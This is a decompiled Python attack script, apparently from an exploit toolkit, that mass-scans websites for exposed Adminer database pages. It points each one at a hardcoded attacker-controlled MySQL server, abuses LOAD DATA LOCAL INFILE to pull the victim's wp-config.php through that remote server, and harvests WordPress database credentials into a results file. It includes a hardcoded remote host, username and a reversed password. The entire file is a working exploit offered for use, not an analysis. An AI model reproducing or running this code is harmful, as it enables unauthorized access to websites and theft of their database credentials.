# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\adminer.py
import requests
import re
import threading
import time
from random import sample
try:
    from urllib import unquote
except:
    from urllib.parse import unquote

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
HOST = '31.210.78.238'
USER = 'francesco_res'
PASS = 'L30zDTZDTP'[::-1]
DB = 'francesco_reservex'
LIST = [
 '/adminer.php',
 '/wp-admin/mysql-adminer.php',
 '/wp-admin/adminer.php',
 '/mysql-adminer.php',
 '/adminer/adminer.php',
 '/uploads/adminer.php',
 '/upload/adminer.php',
 '/adminer/adminer-4.7.0.php',
 '/wp-content/adminer.php',
 '/wp-content/plugins/adminer/inc/editor/index.php',
 '/wp-content/uploads/adminer.php',
 '/adminer/',
 '/_adminer.php',
 '/mirasvit_adminer_mysql.php',
 '/mirasvit_adminer_425.php',
 '/adminer/index.php',
 '/adminer1.php',
 '/mirasvit_adminer_431.php',
 '/mirasvit_adminer-4.2.3.php',
 '/adminer-4.6.2-cs.php',
 '/adminer-4.5.0.php',
 '/adminer-4.3.0.php',
 '/latest.php',
 '/latest-en.php',
 '/latest-mysql.php',
 '/latest-mysql-en.php',
 '/adminer-4.7.0.php']

def RandomGenerator(lenth):
    return ''.join(sample('abcdefghijklmnopqrstuvwxyz', lenth))


def DumpDataConfig(site, Source):
    try:
        Source = unquote(Source).replace('+', ' ')
        DB_Name = str(re.findall("'DB_NAME', '(.*)'", Source)[0]).split("'")[0]
        DB_user = str(re.findall("'DB_USER', '(.*)'", Source)[0]).split("'")[0]
        DB_pass = str(re.findall("'DB_PASSWORD', '(.*)'", Source)[0]).split("'")[0]
        DB_host = str(re.findall("'DB_HOST', '(.*)'", Source)[0]).split("'")[0]
        open('result/MySqlRemoteConnectOK.txt', 'a').write('-------------\n{}\n{},{},{},{}\n'.format(site, DB_host, DB_user, DB_pass, DB_Name))
    except:
        pass


def ReadWpConfig(site, session, NT, Type):
    try:
        S = session.get('{}://'.format(Type) + site + '?server={}&username={}&db={}&select={}'.format(HOST, USER, DB, NT))
        DumpDataConfig(site, str(S.content))
    except:
        pass


def Exploit(site, session, Type):
    TABLENAME = RandomGenerator(8)
    SQLCode = '\nCREATE TABLE {} (blob_col BLOB, INDEX(blob_col(10)));\nLOAD DATA LOCAL INFILE \'wp-config.php\' \nINTO TABLE {}\nFIELDS TERMINATED BY "\n"\n'.format(TABLENAME, TABLENAME)
    H = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
       'Accept-Language': 'en-US,en;q=0.5',
       'Accept-Encoding': 'gzip, deflate, br',
       'Referer': '{}://{}'.format(Type, site) + '?server={}&username={}&db={}&sql='.format(HOST, USER, DB),
       'Connection': 'keep-alive',
       'Upgrade-Insecure-Requests': '1',
       'TE': 'Trailers'
       }
    try:
        T = session.get('{}://'.format(Type) + site + '?server={}&username={}&db={}&sql='.format(HOST, USER, DB), headers=Headers, timeout=10)
        Token = re.findall('<input type="hidden" name="token" value="(.*)">', str(T.content))[0]
        POST_DATA = {'query': str(SQLCode.encode('utf-8')),
           'limit': '',
           'token': Token
           }
        Exp = session.post('{}://'.format(Type) + site + '?server={}&username={}&db={}&sql='.format(HOST, USER, DB), timeout=10, headers=H, data=POST_DATA)
        if 'Query executed OK' in str(Exp.content):
            ReadWpConfig(site, session, TABLENAME, Type)
    except:
        pass


def LoginHTTPS(site, server, username, password, db):
    try:
        LH = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
           'Accept-Language': 'en-US,en;q=0.5',
           'Accept-Encoding': 'gzip, deflate',
           'Referer': 'https://{}'.format(site),
           'Content-Type': 'application/x-www-form-urlencoded',
           'Connection': 'keep-alive',
           'Upgrade-Insecure-Requests': '1'
           }
        Data = {'auth[driver]': 'server',
           'auth[server]': server,
           'auth[username]': username,
           'auth[password]': password,
           'auth[db]': db
           }
        sess = requests.session()
        sess.post('https://' + site, timeout=15, headers=LH, data=Data)
        C = sess.get('http://' + site + '?server={}&username={}&db={}'.format(HOST, USER, DB), timeout=15, headers=Headers)
        if 'value="Logout" id="logout"' in str(C.content):
            Exploit(site, sess, Type='https')
    except:
        pass


def LoginHTTP(site, server, username, password, db):
    try:
        LH = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
           'Accept-Language': 'en-US,en;q=0.5',
           'Accept-Encoding': 'gzip, deflate',
           'Referer': 'http://{}'.format(site),
           'Content-Type': 'application/x-www-form-urlencoded',
           'Connection': 'keep-alive',
           'Upgrade-Insecure-Requests': '1'
           }
        Data = {'auth[driver]': 'server',
           'auth[server]': server,
           'auth[username]': username,
           'auth[password]': password,
           'auth[db]': db
           }
        sess = requests.session()
        sess.post('http://' + site, timeout=15, headers=LH, data=Data)
        C = sess.get('http://' + site + '?server={}&username={}&db={}'.format(HOST, USER, DB), timeout=15, headers=Headers)
        if 'value="Logout" id="logout"' in str(C.content):
            Exploit(site, sess, Type='http')
        else:
            LoginHTTPS(site, server, username, password, db)
    except:
        LoginHTTPS(site, server, username, password, db)


def ConfigOK(site, Path, ConfigPATH):
    try:
        SS = requests.get('http://' + site + Path, timeout=10, headers=Headers)
        if 'class="jush-sql jsonly hidden"' in str(SS.content):
            open('result/MySqlRemoteConnectOK.txt', 'a').write('-------------\nINFO config: {}\nLogin MYsqli: {}\n'.format(ConfigPATH, site + Path))
    except:
        pass


def cConfigOK(site, ConfigPATH):
    if site.startswith('http://'):
        site = site.replace('http://', '')
    elif site.startswith('https://'):
        site = site.replace('https://', '')
    thread = []
    for path in LIST:
        t = threading.Thread(target=ConfigOK, args=(site, path, ConfigPATH))
        t.start()
        thread.append(t)
        time.sleep(0.7)

    for j in thread:
        j.join()


def NoConfig(site, Path):
    try:
        SS = requests.get('http://' + site + Path, timeout=10, headers=Headers)
        if 'class="jush-sql jsonly hidden"' in str(SS.content):
            LoginHTTP(site + Path, HOST, USER, PASS, DB)
    except:
        pass


def ConfigNo(site):
    if site.startswith('http://'):
        site = site.replace('http://', '')
    elif site.startswith('https://'):
        site = site.replace('https://', '')
    thread = []
    for path in LIST:
        t = threading.Thread(target=NoConfig, args=(site, path))
        t.start()
        thread.append(t)
        time.sleep(0.7)

    for j in thread:
        j.join()